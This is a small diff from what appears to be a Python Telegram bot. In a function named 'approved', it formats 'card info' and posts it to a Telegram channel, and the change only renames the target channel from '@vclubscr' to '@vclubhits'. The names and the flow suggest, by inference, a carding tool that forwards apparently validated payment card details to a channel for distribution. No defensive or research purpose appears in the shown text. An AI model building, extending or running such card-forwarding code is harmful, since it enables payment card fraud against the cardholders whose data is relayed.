@@ -77,7 +77,7 @@ async def approved(client_instance, message):
                         )
 
                         # Send message to Telegram channel
-                        await client_instance.send_message(chat_id='@vclubscr', text=formatted_message)
+                        await client_instance.send_message(chat_id='@vclubhits', text=formatted_message)
                         print("Message sent to channel successfully.")
                 except Exception as e:
                     print(f"Error processing card info {card}: {e}")
